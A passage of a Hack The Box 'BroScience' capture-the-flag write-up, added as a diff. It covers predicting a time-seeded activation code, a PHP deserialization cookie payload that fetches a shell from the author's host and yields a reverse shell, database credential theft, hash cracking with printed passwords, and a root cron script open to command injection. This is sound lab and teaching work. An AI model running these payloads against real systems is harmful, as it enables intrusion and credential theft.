@@ -442,5 +442,381 @@ So, when you call the generate_activation_code() function, it will return a rand
 
 ```
 
+So now, all I had to do was to generate a valid code. I could do that if I had an exact time when the rerquest was issued using the same code.
 
+I got the date and time using the Inspector tab from Burp.
 
+![image](https://user-images.githubusercontent.com/87711310/227714207-85988aeb-849a-4eb4-8e32-6a7d7b2dbbb3.png)
+
+Then I added the same date and time in the code, modified it a bit and it's as follow: 
+
+```php
+<?php
+function generate_activation_code() {
+    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
+    srand(strtotime("Sat, 25 Mar 2023 11:12:58 GMT"));
+    $activation_code = "";
+    for ($i = 0; $i < 32; $i++) {
+        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
+    }
+    echo $activation_code;
+}
+generate_activation_code()
+?>
+```
+
+The response after running the script was: 
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ php code-script.php  
+jzJphAWR1c6h7bvAibTQBZOHCpzxI1Um 
+```
+
+So now, If I input this string using the `code` parameter on `/activate.php` page, my account would prolly be activated.
+
+![image](https://user-images.githubusercontent.com/87711310/227714357-de5a8b35-6f1c-4ffd-9e60-52abdd56a560.png)
+
+It did work!!
+
+![image](https://user-images.githubusercontent.com/87711310/227717334-d3a905b9-ac70-4778-a3c3-356033f0bd41.png)
+
+I used cookie editor to look at the cookie of the logged in user.
+
+![image](https://user-images.githubusercontent.com/87711310/227717148-a4117ec8-7681-4a77-8e0d-f8a5aa4c3505.png)
+
+After going throught the code of `includes/utils.php`, I found that a user-pref cookie is generated through serialization techinique which stores the information about the theme and state.
+
+```php
+class Avatar {
+    public $imgPath;
+
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp;
+    public $imgPath; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+```
+
+The avatar class has a parameter `img path` which is used to point to the path of the image and a `tmp` parameter opens the img and saves its content on the server.
+
+The avatar interface has a method/function named `__wakeup()` which creates a new instance of avatar class and a class save method for the the avatar class.
+
+So theoretically if I was able to set the `img-path` to my server and make it receive a PHP shell the `tmp` path will store it on the server and I could trigger a reverse shell after visiting it.
+
+So, the modified payload is:
+
+```php
+<?php
+class Avatar {
+    public $imgPath;
+    
+    public function __construct($imgPath) {
+        $this->imgPath = $imgPath;
+    }
+
+    public function save($tmp) {
+        $f = fopen($this->imgPath, "w");
+        fwrite($f, file_get_contents($tmp));
+        fclose($f);
+    }
+}
+
+class AvatarInterface {
+    public $tmp = "http://10.10.14.11:8081/shell.php";
+    public $imgPath = "./shell.php"; 
+
+    public function __wakeup() {
+        $a = new Avatar($this->imgPath);
+        $a->save($this->tmp);
+    }
+}    
+$payload = base64_encode(serialize(new AvatarInterface));
+echo $payload
+?>
+```
+
+Now, running this script will output a string which is identical to the cookie string .
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ php script-to-generate-serialized-paylaod.php 
+TzoxNToiQXZhdGFySW50ZXJmYWNlIjoyOntzOjM6InRtcCI7czozMzoiaHR0cDovLzEwLjEwLjE0LjExOjgwODEvc2hlbGwucGhwIjtzOjc6ImltZ1BhdGgiO3M6MTE6Ii4vc2hlbGwucGhwIjt9==
+```
+
+So, now that the serialized cookie is generated, I hosted a python server, replaced the cookie and turned on the `netcat` listener.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ python -m http.server 8081
+Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...
+10.10.11.195 - - [25/Mar/2023 09:05:22] "GET /shell.php HTTP/1.0" 200 -
+```
+
+and then visiting the `https://broscience.htb/shell.php` will invoke the shell.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ nc -lvnp 1337                                
+listening on [any] 1337 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.195] 42142
+Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 GNU/Linux
+ 09:13:00 up 1 day,  6:35,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+Upgrading to a better shell.
+
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@broscience:/$ ls
+ls
+bin   home            lib32       media  root  sys  vmlinuz
+boot  initrd.img      lib64       mnt    run   tmp  vmlinuz.old
+dev   initrd.img.old  libx32      opt    sbin  usr
+etc   lib             lost+found  proc   srv   var
+www-data@broscience:/$ pwd
+pwd
+/
+```
+
+Trying to grab the user flag.
+
+```
+www-data@broscience:/$ cd home
+cd home
+lswww-data@broscience:/home$ 
+ls
+bill
+www-data@broscience:/home$ cd bill
+cd bill
+www-data@broscience:/home/bill$ ls
+ls
+Certs    Documents  Music     Public     Videos
+Desktop  Downloads  Pictures  Templates  user.txt
+www-data@broscience:/home/bill$ cat user.txt
+cat user.txt
+cat: user.txt: Permission denied
+```
+
+So, now I needed to escalate my privileges horizontally first.
+
+The first thing I visited was the `db_connect.php` file which I saw on the web in the `/includes` directory.
+
+```
+www-data@broscience:/home/bill$ cd /var/www/html/includes
+cd /var/www/html/includes
+www-data@broscience:/var/www/html/includes$ ls
+ls
+db_connect.php  header.php  img.php  navbar.php  utils.php
+www-data@broscience:/var/www/html/includes$ cat db_connect.php
+cat db_connect.php
+<?php
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
+
+if (!$db_conn) {
+    die("<b>Error</b>: Unable to connect to database");
+}
+```
+
+I had the credentials of `dbuser` and its password. So, I tried logging into the service on the specified port.
+
+```
+?>www-data@broscience:/var/www/html/includes$ psql -h localhost -p 5432 -U dbuser -d broscience
+<$ psql -h localhost -p 5432 -U dbuser -d broscience
+Password for user dbuser: RangeOfMotion%777
+
+psql (13.9 (Debian 13.9-0+deb11u1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type "help" for help.
+
+broscience=> 
+```
+
+And I was in!!
+
+Next, I listed down all the tables in the database using the `\dt` command.
+
+```
+broscience-> \dt
+\dt
+WARNING: terminal is not fully functional
+-  (press RETURN)
+           List of relations
+ Schema |   Name    | Type  |  Owner   
+--------+-----------+-------+----------
+ public | comments  | table | postgres
+ public | exercises | table | postgres
+ public | users     | table | postgres
+(3 rows)
+```
+
+Then, using `TABLE users;` query, I dumped all the content of the `users` table.
+
+```
+broscience=> TABLE users;
+TABLE users;
+1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t | t| 2019-03-07 02:02:22.226763-05
+2 | bill          | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb    | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t | f | 2019-05-07 03:34:44.127644-04
+3 | michael       | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t | f | 2020-10-01 04:12:34.732872-04
+4 | john          | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb    | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t | f | 2021-09-21 11:45:53.118482-04
+5 | dmytro        | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb  | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t | f | 2021-08-13 10:34:36.226763-04
+(5 rows)
+
+```
+
+So, I quickly copied these hashes in a text file in the `hash:salt` format. The salt (NaCl) was mentioned in the `db_connect.php` file.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ cat hashes                    
+15657792073e8a843d4f91fc403454e1:NaCl
+13edad4932da9dbb57d9cd15b66ed104:NaCl
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl
+a7eed23a7be6fe0d765197b1027453fe:NaCl
+5d15340bded5b9395d5d14b9c21bc82b:NaCl
+```
+
+Then I ran `hashcat` to crack the hashes.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ hashcat -m 20 hashes /usr/share/wordlists/rockyou.txt 
+...[snip]...
+13edad4932da9dbb57d9cd15b66ed104:NaCl:iluvhorsesandgym
+5d15340bded5b9395d5d14b9c21bc82b:NaCl:Aaronthehottest     
+bd3dad50e2d578ecba87d5fa15ca5f85:NaCl:2applesplus2apples 
+...[snip]...
+```
+
+`Hashcat` was able to crack 3 hashes.
+
+The only user name I had was `bill`. So, I tried `ssh-ing` into bill's using the cracked hash.
+
+```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/BroScience]
+└─$ ssh bill@broscience.htb  
+The authenticity of host 'broscience.htb (10.10.11.195)' can't be established.
+ED25519 key fingerprint is SHA256:qQRm/99RG60gqk9HTpyf93940WYoqJEnH+MDvJXkM6E.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'broscience.htb' (ED25519) to the list of known hosts.
+bill@broscience.htb's password: 
+Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Mon Jan  2 04:45:21 2023 from 10.10.14.40
+bill@broscience:~$ whoami
+bill
+```
+
+And it worked!!
+
+So, now, grabbing the user flag.
+
+```
+bill@broscience:~$ cat user.txt 
+[REDACTED]
+```
+
+## Privilege Escalation
+Running `pspy64` on the machine, I got this following results.
+
+So, there was this interesting process that was running.
+
+![image](https://user-images.githubusercontent.com/87711310/227724889-f5ad2427-9cf7-48dc-8d81-06a636bd6873.png)
+
+So, Viewing what `renew.sh` does.
+
+```
+bill@broscience:~$ cat /opt/renew_cert.sh 
+#!/bin/bash
+
+if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
+    echo "Usage: $0 certificate.crt";
+    exit 0;
+fi
+
+if [ -f $1 ]; then
+
+    openssl x509 -in $1 -noout -checkend 86400 > /dev/null
+
+    if [ $? -eq 0 ]; then
+        echo "No need to renew yet.";
+        exit 1;
+    fi
+
+    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)
+
+    country=$(echo $subject | grep -Eo 'C = .{2}')
+    state=$(echo $subject | grep -Eo 'ST = .*,')
+    locality=$(echo $subject | grep -Eo 'L = .*,')
+    organization=$(echo $subject | grep -Eo 'O = .*,')
+    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
+    commonName=$(echo $subject | grep -Eo 'CN = .*,?')
+    emailAddress=$(openssl x509 -in $1 -noout -email)
+
+    country=${country:4}
+    state=$(echo ${state:5} | awk -F, '{print $1}')
+    locality=$(echo ${locality:3} | awk -F, '{print $1}')
+    organization=$(echo ${organization:4} | awk -F, '{print $1}')
+    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
+    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')
+
+    echo $subject;
+    echo "";
+    echo "Country     => $country";
+    echo "State       => $state";
+    echo "Locality    => $locality";
+    echo "Org Name    => $organization";
+    echo "Org Unit    => $organizationUnit";
+    echo "Common Name => $commonName";
+    echo "Email       => $emailAddress";
+
+    echo -e "\nGenerating certificate...";
+    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country
+    $state
+    $locality
+    $organization
+    $organizationUnit
+    $commonName
+    $emailAddress
+    " 2>/dev/null
+
+    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"
+else
+    echo "File doesn't exist"
+    exit 1;
+```
+
+Bill:iluvhorsesandgym
